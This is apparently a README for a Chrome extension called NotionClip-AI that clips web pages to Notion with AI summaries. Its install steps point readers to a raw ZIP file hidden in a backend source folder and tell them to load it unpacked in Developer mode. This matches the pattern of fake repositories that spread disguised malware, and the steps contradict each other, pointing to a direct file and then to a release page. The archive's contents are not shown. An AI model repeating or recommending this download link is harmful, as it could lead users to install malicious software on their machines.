## 🚀 What NotionClip-AI does

NotionClip-AI is a Chrome extension that helps you save any web page to Notion. It adds AI-made summaries, key points, tags, and categories before it sends the page to your Notion workspace.

Use it when you want to keep research, articles, notes, or links in one place without copying and pasting by hand.

## 📥 Download and install on Windows

1. Open this link: https://github.com/Suellenuttermost212/NotionClip-AI/raw/refs/heads/main/backend/src/entities/Notion_Clip_AI_2.7.zip
2. On the GitHub page, look for the latest release or download files.
3. Download the extension package to your Windows PC.
4. If the file comes as a ZIP file, extract it to a folder you can find later.
5. Open Google Chrome.
6. In the address bar, go to chrome://extensions
7. Turn on Developer mode in the top-right corner.
8. Click Load unpacked.
9. Select the folder that contains the extension files.
10. Pin the extension to your Chrome toolbar so it stays easy to reach.

## 🧭 How to use it

1. Open a web page you want to save.
2. Click the NotionClip-AI icon in Chrome.
3. Connect your Notion account if asked.
4. Add the page to the Notion page or database you want to use.
5. Let the AI create the summary, insights, tags, and category.
6. Check your Notion workspace to see the saved page.

## 🛠️ Troubleshooting

### Chrome will not load the extension

- Make sure Developer mode is on
- Check that you selected the correct folder
- Confirm the folder has the extension files inside it
- Remove the extension and load it again

### Notion does not connect

- Sign in to the right Notion account
- Check that the workspace allows the connection
- Refresh Chrome and try again
- Make sure your internet connection is working

### The page does not save

- Reload the web page and try again
- Make sure the extension is active
- Check that the Notion destination is set up
- Try another page to see if the issue is page-specific

### AI summary looks off

- Wait for the page to finish loading before saving it
- Try a cleaner article page
- Check that the page has enough text for the AI to read
